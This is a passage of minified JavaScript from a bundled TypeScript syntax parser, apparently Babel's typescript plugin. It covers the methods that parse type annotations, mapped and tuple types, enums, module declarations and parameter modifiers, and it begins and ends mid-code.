if(S_(V)){if(G[V])this.raise(E1.DuplicateModifier,K,{modifier:V});G[V]=!0,H(K,V,"in","out")}else{if(hasOwnProperty.call(G,V))this.raise(E1.DuplicateModifier,K,{modifier:V});else H(K,V,"static","readonly"),H(K,V,"static","override"),H(K,V,"override","readonly"),H(K,V,"abstract","override"),U(K,V,"declare","override"),U(K,V,"static","abstract");G[V]=!0}if(Y!=null&&Y.includes(V))this.raise(z,K,{modifier:V})}}tsIsListTerminator(Q){switch(Q){case"EnumMembers":case"TypeMembers":return this.match(8);case"HeritageClauseElement":return this.match(5);case"TupleElementTypes":return this.match(3);case"TypeParametersOrArguments":return this.match(48)}}tsParseList(Q,Y){let W=[];while(!this.tsIsListTerminator(Q))W.push(Y());return W}tsParseDelimitedList(Q,Y,W){return C_(this.tsParseDelimitedListWorker(Q,Y,!0,W))}tsParseDelimitedListWorker(Q,Y,W,z){let G=[],H=-1;for(;;){if(this.tsIsListTerminator(Q))break;H=-1;let U=Y();if(U==null)return;if(G.push(U),this.eat(12)){H=this.state.lastTokStartLoc.index;continue}if(this.tsIsListTerminator(Q))break;if(W)this.expect(12);return}if(z)z.value=H;return G}tsParseBracketedList(Q,Y,W,z,G){if(!z)if(W)this.expect(0);else this.expect(47);let H=this.tsParseDelimitedList(Q,Y,G);if(W)this.expect(3);else this.expect(48);return H}tsParseImportType(){let Q=this.startNode();if(this.expect(83),this.expect(10),!this.match(134))this.raise(E1.UnsupportedImportTypeArgument,this.state.startLoc),Q.argument=super.parseExprAtom();else Q.argument=this.parseStringLiteral(this.state.value);if(this.eat(12))Q.options=this.tsParseImportTypeOptions();else Q.options=null;if(this.expect(11),this.eat(16))Q.qualifier=this.tsParseEntityName(3);if(this.match(47))Q.typeParameters=this.tsParseTypeArguments();return this.finishNode(Q,"TSImportType")}tsParseImportTypeOptions(){let Q=this.startNode();this.expect(5);let Y=this.startNode();if(this.isContextual(76))Y.method=!1,Y.key=this.parseIdentifier(!0),Y.computed=!1,Y.shorthand=!1;else this.unexpected(null,76);return this.expect(14),Y.value=this.tsParseImportTypeWithPropertyValue(),Q.properties=[this.finishObjectProperty(Y)],this.eat(12),this.expect(8),this.finishNode(Q,"ObjectExpression")}tsParseImportTypeWithPropertyValue(){let Q=this.startNode(),Y=[];this.expect(5);while(!this.match(8)){let W=this.state.type;if(C0(W)||W===134)Y.push(super.parsePropertyDefinition(null));else this.unexpected();this.eat(12)}return Q.properties=Y,this.next(),this.finishNode(Q,"ObjectExpression")}tsParseEntityName(Q){let Y;if(Q&1&&this.match(78))if(Q&2)Y=this.parseIdentifier(!0);else{let W=this.startNode();this.next(),Y=this.finishNode(W,"ThisExpression")}else Y=this.parseIdentifier(!!(Q&1));while(this.eat(16)){let W=this.startNodeAtNode(Y);W.left=Y,W.right=this.parseIdentifier(!!(Q&1)),Y=this.finishNode(W,"TSQualifiedName")}return Y}tsParseTypeReference(){let Q=this.startNode();if(Q.typeName=this.tsParseEntityName(1),!this.hasPrecedingLineBreak()&&this.match(47))Q.typeParameters=this.tsParseTypeArguments();return this.finishNode(Q,"TSTypeReference")}tsParseThisTypePredicate(Q){this.next();let Y=this.startNodeAtNode(Q);return Y.parameterName=Q,Y.typeAnnotation=this.tsParseTypeAnnotation(!1),Y.asserts=!1,this.finishNode(Y,"TSTypePredicate")}tsParseThisTypeNode(){let Q=this.startNode();return this.next(),this.finishNode(Q,"TSThisType")}tsParseTypeQuery(){let Q=this.startNode();if(this.expect(87),this.match(83))Q.exprName=this.tsParseImportType();else Q.exprName=this.tsParseEntityName(3);if(!this.hasPrecedingLineBreak()&&this.match(47))Q.typeParameters=this.tsParseTypeArguments();return this.finishNode(Q,"TSTypeQuery")}tsParseTypeParameter(Q){let Y=this.startNode();return Q(Y),Y.name=this.tsParseTypeParameterName(),Y.constraint=this.tsEatThenParseType(81),Y.default=this.tsEatThenParseType(29),this.finishNode(Y,"TSTypeParameter")}tsTryParseTypeParameters(Q){if(this.match(47))return this.tsParseTypeParameters(Q)}tsParseTypeParameters(Q){let Y=this.startNode();if(this.match(47)||this.match(143))this.next();else this.unexpected();let W={value:-1};if(Y.params=this.tsParseBracketedList("TypeParametersOrArguments",this.tsParseTypeParameter.bind(this,Q),!1,!0,W),Y.params.length===0)this.raise(E1.EmptyTypeParameters,Y);if(W.value!==-1)this.addExtra(Y,"trailingComma",W.value);return this.finishNode(Y,"TSTypeParameterDeclaration")}tsFillSignature(Q,Y){let W=Q===19,z="parameters",G="typeAnnotation";if(Y.typeParameters=this.tsTryParseTypeParameters(this.tsParseConstModifier),this.expect(10),Y.parameters=this.tsParseBindingListForSignature(),W)Y.typeAnnotation=this.tsParseTypeOrTypePredicateAnnotation(Q);else if(this.match(Q))Y.typeAnnotation=this.tsParseTypeOrTypePredicateAnnotation(Q)}tsParseBindingListForSignature(){let Q=super.parseBindingList(11,41,2);for(let Y of Q){let{type:W}=Y;if(W==="AssignmentPattern"||W==="TSParameterProperty")this.raise(E1.UnsupportedSignatureParameterKind,Y,{type:W})}return Q}tsParseTypeMemberSemicolon(){if(!this.eat(12)&&!this.isLineTerminator())this.expect(13)}tsParseSignatureMember(Q,Y){return this.tsFillSignature(14,Y),this.tsParseTypeMemberSemicolon(),this.finishNode(Y,Q)}tsIsUnambiguouslyIndexSignature(){if(this.next(),C0(this.state.type))return this.next(),this.match(14);return!1}tsTryParseIndexSignature(Q){if(!(this.match(0)&&this.tsLookAhead(this.tsIsUnambiguouslyIndexSignature.bind(this))))return;this.expect(0);let Y=this.parseIdentifier();Y.typeAnnotation=this.tsParseTypeAnnotation(),this.resetEndLocation(Y),this.expect(3),Q.parameters=[Y];let W=this.tsTryParseTypeAnnotation();if(W)Q.typeAnnotation=W;return this.tsParseTypeMemberSemicolon(),this.finishNode(Q,"TSIndexSignature")}tsParsePropertyOrMethodSignature(Q,Y){if(this.eat(17))Q.optional=!0;if(this.match(10)||this.match(47)){if(Y)this.raise(E1.ReadonlyForMethodSignature,Q);let W=Q;if(W.kind&&this.match(47))this.raise(E1.AccessorCannotHaveTypeParameters,this.state.curPosition());this.tsFillSignature(14,W),this.tsParseTypeMemberSemicolon();let z="parameters",G="typeAnnotation";if(W.kind==="get"){if(W[z].length>0){if(this.raise(b.BadGetterArity,this.state.curPosition()),this.isThisParam(W[z][0]))this.raise(E1.AccessorCannotDeclareThisParameter,this.state.curPosition())}}else if(W.kind==="set"){if(W[z].length!==1)this.raise(b.BadSetterArity,this.state.curPosition());else{let H=W[z][0];if(this.isThisParam(H))this.raise(E1.AccessorCannotDeclareThisParameter,this.state.curPosition());if(H.type==="Identifier"&&H.optional)this.raise(E1.SetAccessorCannotHaveOptionalParameter,this.state.curPosition());if(H.type==="RestElement")this.raise(E1.SetAccessorCannotHaveRestParameter,this.state.curPosition())}if(W[G])this.raise(E1.SetAccessorCannotHaveReturnType,W[G])}else W.kind="method";return this.finishNode(W,"TSMethodSignature")}else{let W=Q;if(Y)W.readonly=!0;let z=this.tsTryParseTypeAnnotation();if(z)W.typeAnnotation=z;return this.tsParseTypeMemberSemicolon(),this.finishNode(W,"TSPropertySignature")}}tsParseTypeMember(){let Q=this.startNode();if(this.match(10)||this.match(47))return this.tsParseSignatureMember("TSCallSignatureDeclaration",Q);if(this.match(77)){let W=this.startNode();if(this.next(),this.match(10)||this.match(47))return this.tsParseSignatureMember("TSConstructSignatureDeclaration",Q);else return Q.key=this.createIdentifier(W,"new"),this.tsParsePropertyOrMethodSignature(Q,!1)}this.tsParseModifiers({allowedModifiers:["readonly"],disallowedModifiers:["declare","abstract","private","protected","public","static","override"]},Q);let Y=this.tsTryParseIndexSignature(Q);if(Y)return Y;if(super.parsePropertyName(Q),!Q.computed&&Q.key.type==="Identifier"&&(Q.key.name==="get"||Q.key.name==="set")&&this.tsTokenCanFollowModifier()){if(Q.kind=Q.key.name,super.parsePropertyName(Q),!this.match(10)&&!this.match(47))this.unexpected(null,10)}return this.tsParsePropertyOrMethodSignature(Q,!!Q.readonly)}tsParseTypeLiteral(){let Q=this.startNode();return Q.members=this.tsParseObjectTypeMembers(),this.finishNode(Q,"TSTypeLiteral")}tsParseObjectTypeMembers(){this.expect(5);let Q=this.tsParseList("TypeMembers",this.tsParseTypeMember.bind(this));return this.expect(8),Q}tsIsStartOfMappedType(){if(this.next(),this.eat(53))return this.isContextual(122);if(this.isContextual(122))this.next();if(!this.match(0))return!1;if(this.next(),!this.tsIsIdentifier())return!1;return this.next(),this.match(58)}tsParseMappedType(){let Q=this.startNode();if(this.expect(5),this.match(53))Q.readonly=this.state.value,this.next(),this.expectContextual(122);else if(this.eatContextual(122))Q.readonly=!0;this.expect(0);{let Y=this.startNode();Y.name=this.tsParseTypeParameterName(),Y.constraint=this.tsExpectThenParseType(58),Q.typeParameter=this.finishNode(Y,"TSTypeParameter")}if(Q.nameType=this.eatContextual(93)?this.tsParseType():null,this.expect(3),this.match(53))Q.optional=this.state.value,this.next(),this.expect(17);else if(this.eat(17))Q.optional=!0;return Q.typeAnnotation=this.tsTryParseType(),this.semicolon(),this.expect(8),this.finishNode(Q,"TSMappedType")}tsParseTupleType(){let Q=this.startNode();Q.elementTypes=this.tsParseBracketedList("TupleElementTypes",this.tsParseTupleElementType.bind(this),!0,!1);let Y=!1;return Q.elementTypes.forEach((W)=>{let{type:z}=W;if(Y&&z!=="TSRestType"&&z!=="TSOptionalType"&&!(z==="TSNamedTupleMember"&&W.optional))this.raise(E1.OptionalTypeBeforeRequired,W);Y||(Y=z==="TSNamedTupleMember"&&W.optional||z==="TSOptionalType")}),this.finishNode(Q,"TSTupleType")}tsParseTupleElementType(){let Q=this.state.startLoc,Y=this.eat(21),{startLoc:W}=this.state,z,G,H,U,V=I8(this.state.type)?this.lookaheadCharCode():null;if(V===58)z=!0,H=!1,G=this.parseIdentifier(!0),this.expect(14),U=this.tsParseType();else if(V===63){H=!0;let B=this.state.value,Z=this.tsParseNonArrayType();if(this.lookaheadCharCode()===58)z=!0,G=this.createIdentifier(this.startNodeAt(W),B),this.expect(17),this.expect(14),U=this.tsParseType();else z=!1,U=Z,this.expect(17)}else U=this.tsParseType(),H=this.eat(17),z=this.eat(14);if(z){let B;if(G){if(B=this.startNodeAt(W),B.optional=H,B.label=G,B.elementType=U,this.eat(17))B.optional=!0,this.raise(E1.TupleOptionalAfterType,this.state.lastTokStartLoc)}else B=this.startNodeAt(W),B.optional=H,this.raise(E1.InvalidTupleMemberLabel,U),B.label=U,B.elementType=this.tsParseType();U=this.finishNode(B,"TSNamedTupleMember")}else if(H){let B=this.startNodeAt(W);B.typeAnnotation=U,U=this.finishNode(B,"TSOptionalType")}if(Y){let B=this.startNodeAt(Q);B.typeAnnotation=U,U=this.finishNode(B,"TSRestType")}return U}tsParseParenthesizedType(){let Q=this.startNode();return this.expect(10),Q.typeAnnotation=this.tsParseType(),this.expect(11),this.finishNode(Q,"TSParenthesizedType")}tsParseFunctionOrConstructorType(Q,Y){let W=this.startNode();if(Q==="TSConstructorType"){if(W.abstract=!!Y,Y)this.next();this.next()}return this.tsInAllowConditionalTypesContext(()=>this.tsFillSignature(19,W)),this.finishNode(W,Q)}tsParseLiteralTypeNode(){let Q=this.startNode();switch(this.state.type){case 135:case 136:case 134:case 85:case 86:Q.literal=super.parseExprAtom();break;default:this.unexpected()}return this.finishNode(Q,"TSLiteralType")}tsParseTemplateLiteralType(){{let Q=this.startNode();return Q.literal=super.parseTemplate(!1),this.finishNode(Q,"TSLiteralType")}}parseTemplateSubstitution(){if(this.state.inType)return this.tsParseType();return super.parseTemplateSubstitution()}tsParseThisTypeOrThisTypePredicate(){let Q=this.tsParseThisTypeNode();if(this.isContextual(116)&&!this.hasPrecedingLineBreak())return this.tsParseThisTypePredicate(Q);else return Q}tsParseNonArrayType(){switch(this.state.type){case 134:case 135:case 136:case 85:case 86:return this.tsParseLiteralTypeNode();case 53:if(this.state.value==="-"){let Q=this.startNode(),Y=this.lookahead();if(Y.type!==135&&Y.type!==136)this.unexpected();return Q.literal=this.parseMaybeUnary(),this.finishNode(Q,"TSLiteralType")}break;case 78:return this.tsParseThisTypeOrThisTypePredicate();case 87:return this.tsParseTypeQuery();case 83:return this.tsParseImportType();case 5:return this.tsLookAhead(this.tsIsStartOfMappedType.bind(this))?this.tsParseMappedType():this.tsParseTypeLiteral();case 0:return this.tsParseTupleType();case 10:return this.tsParseParenthesizedType();case 25:case 24:return this.tsParseTemplateLiteralType();default:{let{type:Q}=this.state;if(C0(Q)||Q===88||Q===84){let Y=Q===88?"TSVoidKeyword":Q===84?"TSNullKeyword":P_(this.state.value);if(Y!==void 0&&this.lookaheadCharCode()!==46){let W=this.startNode();return this.next(),this.finishNode(W,Y)}return this.tsParseTypeReference()}}}this.unexpected()}tsParseArrayTypeOrHigher(){let{startLoc:Q}=this.state,Y=this.tsParseNonArrayType();while(!this.hasPrecedingLineBreak()&&this.eat(0))if(this.match(3)){let W=this.startNodeAt(Q);W.elementType=Y,this.expect(3),Y=this.finishNode(W,"TSArrayType")}else{let W=this.startNodeAt(Q);W.objectType=Y,W.indexType=this.tsParseType(),this.expect(3),Y=this.finishNode(W,"TSIndexedAccessType")}return Y}tsParseTypeOperator(){let Q=this.startNode(),Y=this.state.value;if(this.next(),Q.operator=Y,Q.typeAnnotation=this.tsParseTypeOperatorOrHigher(),Y==="readonly")this.tsCheckTypeAnnotationForReadOnly(Q);return this.finishNode(Q,"TSTypeOperator")}tsCheckTypeAnnotationForReadOnly(Q){switch(Q.typeAnnotation.type){case"TSTupleType":case"TSArrayType":return;default:this.raise(E1.UnexpectedReadonly,Q)}}tsParseInferType(){let Q=this.startNode();this.expectContextual(115);let Y=this.startNode();return Y.name=this.tsParseTypeParameterName(),Y.constraint=this.tsTryParse(()=>this.tsParseConstraintForInferType()),Q.typeParameter=this.finishNode(Y,"TSTypeParameter"),this.finishNode(Q,"TSInferType")}tsParseConstraintForInferType(){if(this.eat(81)){let Q=this.tsInDisallowConditionalTypesContext(()=>this.tsParseType());if(this.state.inDisallowConditionalTypesContext||!this.match(17))return Q}}tsParseTypeOperatorOrHigher(){return nT(this.state.type)&&!this.state.containsEsc?this.tsParseTypeOperator():this.isContextual(115)?this.tsParseInferType():this.tsInAllowConditionalTypesContext(()=>this.tsParseArrayTypeOrHigher())}tsParseUnionOrIntersectionType(Q,Y,W){let z=this.startNode(),G=this.eat(W),H=[];do H.push(Y());while(this.eat(W));if(H.length===1&&!G)return H[0];return z.types=H,this.finishNode(z,Q)}tsParseIntersectionTypeOrHigher(){return this.tsParseUnionOrIntersectionType("TSIntersectionType",this.tsParseTypeOperatorOrHigher.bind(this),45)}tsParseUnionTypeOrHigher(){return this.tsParseUnionOrIntersectionType("TSUnionType",this.tsParseIntersectionTypeOrHigher.bind(this),43)}tsIsStartOfFunctionType(){if(this.match(47))return!0;return this.match(10)&&this.tsLookAhead(this.tsIsUnambiguouslyStartOfFunctionType.bind(this))}tsSkipParameterStart(){if(C0(this.state.type)||this.match(78))return this.next(),!0;if(this.match(5)){let{errors:Q}=this.state,Y=Q.length;try{return this.parseObjectLike(8,!0),Q.length===Y}catch(W){return!1}}if(this.match(0)){this.next();let{errors:Q}=this.state,Y=Q.length;try{return super.parseBindingList(3,93,1),Q.length===Y}catch(W){return!1}}return!1}tsIsUnambiguouslyStartOfFunctionType(){if(this.next(),this.match(11)||this.match(21))return!0;if(this.tsSkipParameterStart()){if(this.match(14)||this.match(12)||this.match(17)||this.match(29))return!0;if(this.match(11)){if(this.next(),this.match(19))return!0}}return!1}tsParseTypeOrTypePredicateAnnotation(Q){return this.tsInType(()=>{let Y=this.startNode();this.expect(Q);let W=this.startNode(),z=!!this.tsTryParse(this.tsParseTypePredicateAsserts.bind(this));if(z&&this.match(78)){let U=this.tsParseThisTypeOrThisTypePredicate();if(U.type==="TSThisType")W.parameterName=U,W.asserts=!0,W.typeAnnotation=null,U=this.finishNode(W,"TSTypePredicate");else this.resetStartLocationFromNode(U,W),U.asserts=!0;return Y.typeAnnotation=U,this.finishNode(Y,"TSTypeAnnotation")}let G=this.tsIsIdentifier()&&this.tsTryParse(this.tsParseTypePredicatePrefix.bind(this));if(!G){if(!z)return this.tsParseTypeAnnotation(!1,Y);return W.parameterName=this.parseIdentifier(),W.asserts=z,W.typeAnnotation=null,Y.typeAnnotation=this.finishNode(W,"TSTypePredicate"),this.finishNode(Y,"TSTypeAnnotation")}let H=this.tsParseTypeAnnotation(!1);return W.parameterName=G,W.typeAnnotation=H,W.asserts=z,Y.typeAnnotation=this.finishNode(W,"TSTypePredicate"),this.finishNode(Y,"TSTypeAnnotation")})}tsTryParseTypeOrTypePredicateAnnotation(){if(this.match(14))return this.tsParseTypeOrTypePredicateAnnotation(14)}tsTryParseTypeAnnotation(){if(this.match(14))return this.tsParseTypeAnnotation()}tsTryParseType(){return this.tsEatThenParseType(14)}tsParseTypePredicatePrefix(){let Q=this.parseIdentifier();if(this.isContextual(116)&&!this.hasPrecedingLineBreak())return this.next(),Q}tsParseTypePredicateAsserts(){if(this.state.type!==109)return!1;let Q=this.state.containsEsc;if(this.next(),!C0(this.state.type)&&!this.match(78))return!1;if(Q)this.raise(b.InvalidEscapedReservedWord,this.state.lastTokStartLoc,{reservedWord:"asserts"});return!0}tsParseTypeAnnotation(Q=!0,Y=this.startNode()){return this.tsInType(()=>{if(Q)this.expect(14);Y.typeAnnotation=this.tsParseType()}),this.finishNode(Y,"TSTypeAnnotation")}tsParseType(){gK(this.state.inType);let Q=this.tsParseNonConditionalType();if(this.state.inDisallowConditionalTypesContext||this.hasPrecedingLineBreak()||!this.eat(81))return Q;let Y=this.startNodeAtNode(Q);return Y.checkType=Q,Y.extendsType=this.tsInDisallowConditionalTypesContext(()=>this.tsParseNonConditionalType()),this.expect(17),Y.trueType=this.tsInAllowConditionalTypesContext(()=>this.tsParseType()),this.expect(14),Y.falseType=this.tsInAllowConditionalTypesContext(()=>this.tsParseType()),this.finishNode(Y,"TSConditionalType")}isAbstractConstructorSignature(){return this.isContextual(124)&&this.isLookaheadContextual("new")}tsParseNonConditionalType(){if(this.tsIsStartOfFunctionType())return this.tsParseFunctionOrConstructorType("TSFunctionType");if(this.match(77))return this.tsParseFunctionOrConstructorType("TSConstructorType");else if(this.isAbstractConstructorSignature())return this.tsParseFunctionOrConstructorType("TSConstructorType",!0);return this.tsParseUnionTypeOrHigher()}tsParseTypeAssertion(){if(this.getPluginOption("typescript","disallowAmbiguousJSXLike"))this.raise(E1.ReservedTypeAssertion,this.state.startLoc);let Q=this.startNode();return Q.typeAnnotation=this.tsInType(()=>{return this.next(),this.match(75)?this.tsParseTypeReference():this.tsParseType()}),this.expect(48),Q.expression=this.parseMaybeUnary(),this.finishNode(Q,"TSTypeAssertion")}tsParseHeritageClause(Q){let Y=this.state.startLoc,W=this.tsParseDelimitedList("HeritageClauseElement",()=>{{let z=this.startNode();if(z.expression=this.tsParseEntityName(3),this.match(47))z.typeParameters=this.tsParseTypeArguments();return this.finishNode(z,"TSExpressionWithTypeArguments")}});if(!W.length)this.raise(E1.EmptyHeritageClauseType,Y,{token:Q});return W}tsParseInterfaceDeclaration(Q,Y={}){if(this.hasFollowingLineBreak())return null;if(this.expectContextual(129),Y.declare)Q.declare=!0;if(C0(this.state.type))Q.id=this.parseIdentifier(),this.checkIdentifier(Q.id,130);else Q.id=null,this.raise(E1.MissingInterfaceName,this.state.startLoc);if(Q.typeParameters=this.tsTryParseTypeParameters(this.tsParseInOutConstModifiers),this.eat(81))Q.extends=this.tsParseHeritageClause("extends");let W=this.startNode();return W.body=this.tsInType(this.tsParseObjectTypeMembers.bind(this)),Q.body=this.finishNode(W,"TSInterfaceBody"),this.finishNode(Q,"TSInterfaceDeclaration")}tsParseTypeAliasDeclaration(Q){return Q.id=this.parseIdentifier(),this.checkIdentifier(Q.id,2),Q.typeAnnotation=this.tsInType(()=>{if(Q.typeParameters=this.tsTryParseTypeParameters(this.tsParseInOutModifiers),this.expect(29),this.isContextual(114)&&this.lookaheadCharCode()!==46){let Y=this.startNode();return this.next(),this.finishNode(Y,"TSIntrinsicKeyword")}return this.tsParseType()}),this.semicolon(),this.finishNode(Q,"TSTypeAliasDeclaration")}tsInTopLevelContext(Q){if(this.curContext()!==w0.brace){let Y=this.state.context;this.state.context=[Y[0]];try{return Q()}finally{this.state.context=Y}}else return Q()}tsInType(Q){let Y=this.state.inType;this.state.inType=!0;try{return Q()}finally{this.state.inType=Y}}tsInDisallowConditionalTypesContext(Q){let Y=this.state.inDisallowConditionalTypesContext;this.state.inDisallowConditionalTypesContext=!0;try{return Q()}finally{this.state.inDisallowConditionalTypesContext=Y}}tsInAllowConditionalTypesContext(Q){let Y=this.state.inDisallowConditionalTypesContext;this.state.inDisallowConditionalTypesContext=!1;try{return Q()}finally{this.state.inDisallowConditionalTypesContext=Y}}tsEatThenParseType(Q){if(this.match(Q))return this.tsNextThenParseType()}tsExpectThenParseType(Q){return this.tsInType(()=>{return this.expect(Q),this.tsParseType()})}tsNextThenParseType(){return this.tsInType(()=>{return this.next(),this.tsParseType()})}tsParseEnumMember(){let Q=this.startNode();if(Q.id=this.match(134)?super.parseStringLiteral(this.state.value):this.parseIdentifier(!0),this.eat(29))Q.initializer=super.parseMaybeAssignAllowIn();return this.finishNode(Q,"TSEnumMember")}tsParseEnumDeclaration(Q,Y={}){if(Y.const)Q.const=!0;if(Y.declare)Q.declare=!0;return this.expectContextual(126),Q.id=this.parseIdentifier(),this.checkIdentifier(Q.id,Q.const?8971:8459),this.expect(5),Q.members=this.tsParseDelimitedList("EnumMembers",this.tsParseEnumMember.bind(this)),this.expect(8),this.finishNode(Q,"TSEnumDeclaration")}tsParseEnumBody(){let Q=this.startNode();return this.expect(5),Q.members=this.tsParseDelimitedList("EnumMembers",this.tsParseEnumMember.bind(this)),this.expect(8),this.finishNode(Q,"TSEnumBody")}tsParseModuleBlock(){let Q=this.startNode();return this.scope.enter(0),this.expect(5),super.parseBlockOrModuleBlockBody(Q.body=[],void 0,!0,8),this.scope.exit(),this.finishNode(Q,"TSModuleBlock")}tsParseModuleOrNamespaceDeclaration(Q,Y=!1){if(Q.id=this.parseIdentifier(),!Y)this.checkIdentifier(Q.id,1024);if(this.eat(16)){let W=this.startNode();this.tsParseModuleOrNamespaceDeclaration(W,!0),Q.body=W}else this.scope.enter(1024),this.prodParam.enter(0),Q.body=this.tsParseModuleBlock(),this.prodParam.exit(),this.scope.exit();return this.finishNode(Q,"TSModuleDeclaration")}tsParseAmbientExternalModuleDeclaration(Q){if(this.isContextual(112))Q.kind="global",Q.global=!0,Q.id=this.parseIdentifier();else if(this.match(134))Q.kind="module",Q.id=super.parseStringLiteral(this.state.value);else this.unexpected();if(this.match(5))this.scope.enter(1024),this.prodParam.enter(0),Q.body=this.tsParseModuleBlock(),this.prodParam.exit(),this.scope.exit();else this.semicolon();return this.finishNode(Q,"TSModuleDeclaration")}tsParseImportEqualsDeclaration(Q,Y,W){Q.isExport=W||!1,Q.id=Y||this.parseIdentifier(),this.checkIdentifier(Q.id,4096),this.expect(29);let z=this.tsParseModuleReference();if(Q.importKind==="type"&&z.type!=="TSExternalModuleReference")this.raise(E1.ImportAliasHasImportType,z);return Q.moduleReference=z,this.semicolon(),this.finishNode(Q,"TSImportEqualsDeclaration")}tsIsExternalModuleReference(){return this.isContextual(119)&&this.lookaheadCharCode()===40}tsParseModuleReference(){return this.tsIsExternalModuleReference()?this.tsParseExternalModuleReference():this.tsParseEntityName(0)}tsParseExternalModuleReference(){let Q=this.startNode();if(this.expectContextual(119),this.expect(10),!this.match(134))this.unexpected();return Q.expression=super.parseExprAtom(),this.expect(11),this.sawUnambiguousESM=!0,this.finishNode(Q,"TSExternalModuleReference")}tsLookAhead(Q){let Y=this.state.clone(),W=Q();return this.state=Y,W}tsTryParseAndCatch(Q){let Y=this.tryParse((W)=>Q()||W());if(Y.aborted||!Y.node)return;if(Y.error)this.state=Y.failState;return Y.node}tsTryParse(Q){let Y=this.state.clone(),W=Q();if(W!==void 0&&W!==!1)return W;this.state=Y}tsTryParseDeclare(Q){if(this.isLineTerminator())return;let Y=this.state.type;return this.tsInAmbientContext(()=>{switch(Y){case 68:return Q.declare=!0,super.parseFunctionStatement(Q,!1,!1);case 80:return Q.declare=!0,this.parseClass(Q,!0,!1);case 126:return this.tsParseEnumDeclaration(Q,{declare:!0});case 112:return this.tsParseAmbientExternalModuleDeclaration(Q);case 100:if(this.state.containsEsc)return;case 75:case 74:if(!this.match(75)||!this.isLookaheadContextual("enum"))return Q.declare=!0,this.parseVarStatement(Q,this.state.value,!0);return this.expect(75),this.tsParseEnumDeclaration(Q,{const:!0,declare:!0});case 107:if(this.isUsing())return this.raise(E1.InvalidModifierOnUsingDeclaration,this.state.startLoc,"declare"),Q.declare=!0,this.parseVarStatement(Q,"using",!0);break;case 96:if(this.isAwaitUsing())return this.raise(E1.InvalidModifierOnAwaitUsingDeclaration,this.state.startLoc,"declare"),Q.declare=!0,this.next(),this.parseVarStatement(Q,"await using",!0);break;case 129:{let W=this.tsParseInterfaceDeclaration(Q,{declare:!0});if(W)return W}default:if(C0(Y))return this.tsParseDeclaration(Q,this.state.value,!0,null)}})}tsTryParseExportDeclaration(){return this.tsParseDeclaration(this.startNode(),this.state.value,!0,null)}tsParseExpressionStatement(Q,Y,W){switch(Y.name){case"declare":{let z=this.tsTryParseDeclare(Q);if(z)z.declare=!0;return z}case"global":if(this.match(5)){this.scope.enter(1024),this.prodParam.enter(0);let z=Q;return z.kind="global",Q.global=!0,z.id=Y,z.body=this.tsParseModuleBlock(),this.scope.exit(),this.prodParam.exit(),this.finishNode(z,"TSModuleDeclaration")}break;default:return this.tsParseDeclaration(Q,Y.name,!1,W)}}tsParseDeclaration(Q,Y,W,z){switch(Y){case"abstract":if(this.tsCheckLineTerminator(W)&&(this.match(80)||C0(this.state.type)))return this.tsParseAbstractDeclaration(Q,z);break;case"module":if(this.tsCheckLineTerminator(W)){if(this.match(134))return this.tsParseAmbientExternalModuleDeclaration(Q);else if(C0(this.state.type))return Q.kind="module",this.tsParseModuleOrNamespaceDeclaration(Q)}break;case"namespace":if(this.tsCheckLineTerminator(W)&&C0(this.state.type))return Q.kind="namespace",this.tsParseModuleOrNamespaceDeclaration(Q);break;case"type":if(this.tsCheckLineTerminator(W)&&C0(this.state.type))return this.tsParseTypeAliasDeclaration(Q);break}}tsCheckLineTerminator(Q){if(Q){if(this.hasFollowingLineBreak())return!1;return this.next(),!0}return!this.isLineTerminator()}tsTryParseGenericAsyncArrowFunction(Q){if(!this.match(47))return;let Y=this.state.maybeInArrowParameters;this.state.maybeInArrowParameters=!0;let W=this.tsTryParseAndCatch(()=>{let z=this.startNodeAt(Q);return z.typeParameters=this.tsParseTypeParameters(this.tsParseConstModifier),super.parseFunctionParams(z),z.returnType=this.tsTryParseTypeOrTypePredicateAnnotation(),this.expect(19),z});if(this.state.maybeInArrowParameters=Y,!W)return;return super.parseArrowExpression(W,null,!0)}tsParseTypeArgumentsInExpression(){if(this.reScan_lt()!==47)return;return this.tsParseTypeArguments()}tsParseTypeArguments(){let Q=this.startNode();if(Q.params=this.tsInType(()=>this.tsInTopLevelContext(()=>{return this.expect(47),this.tsParseDelimitedList("TypeParametersOrArguments",this.tsParseType.bind(this))})),Q.params.length===0)this.raise(E1.EmptyTypeArguments,Q);else if(!this.state.inType&&this.curContext()===w0.brace)this.reScan_lt_gt();return this.expect(48),this.finishNode(Q,"TSTypeParameterInstantiation")}tsIsDeclarationStart(){return aT(this.state.type)}isExportDefaultSpecifier(){if(this.tsIsDeclarationStart())return!1;return super.isExportDefaultSpecifier()}parseBindingElement(Q,Y){let W=Y.length?Y[0].loc.start:this.state.startLoc,z={};this.tsParseModifiers({allowedModifiers:["public","private","protected","override","readonly"]},z);let{accessibility:G,override:H,readonly:U}=z;if(!(Q&4)&&(G||U||H))this.raise(E1.UnexpectedParameterModifier,W);let K=this.parseMaybeDefault();if(Q&2)this.parseFunctionParamType(K);let V=this.parseMaybeDefault(K.loc.start,K);if(G||U||H){let B=this.startNodeAt(W);if(Y.length)B.decorators=Y;if(G)B.accessibility=G;if(U)B.readonly=U;if(H)B.override=H;if(V.type!=="Identifier"&&V.type!=="AssignmentPattern")this.raise(E1.UnsupportedParameterPropertyKind,B);return B.parameter=V,this.finishNode(B,"TSParameterProperty")}if(Y.length)K.decorators=Y;return V}isSimpleParameter(Q){return Q.type==="TSParameterProperty"&&super.isSimpleParameter(Q.parameter)||super.isSimpleParameter(Q)}tsDisallowOptionalPattern(Q){for(let Y of Q.params)if(Y.type!=="Identifier"&&Y.optional&&!this.state.isAmbientContext)this.raise(E1.PatternIsOptional,Y)}setArrowFunctionParameters(Q,Y,W){super.setArrowFunctionParameters(Q,Y,W),this.tsDisallowOptionalPattern(Q)}parseFunctionBodyAndFinish(Q,Y,W=!1){if(this.match(14))Q.returnType=this.tsParseTypeOrTypePredicateAnnotation(14);let z=Y==="FunctionDeclaration"?"TSDeclareFunction":Y==="ClassMethod"||Y==="ClassPrivateMethod"?"TSDeclareMethod":void 0;if(z&&!this.match(5)&&this.isLineTerminator())return this.finishNode(Q,z);if(z==="TSDeclareFunction"&&this.state.isAmbientContext){if(this.raise(E1.DeclareFunctionHasImplementation,Q),Q.declare)return super.parseFunctionBodyAndFinish(Q,z,W)}return this.tsDisallowOptionalPattern(Q),super.parseFunctionBodyAndFinish(Q,Y,W)}registerFunctionStatementId(Q){if(!Q.body&&Q.id)this.checkIdentifier(Q.id,1024);else super.registerFunctionStatementId(Q)}tsCheckForInvalidTypeCasts(Q){Q.forEach((Y)=>{if((Y==null?void 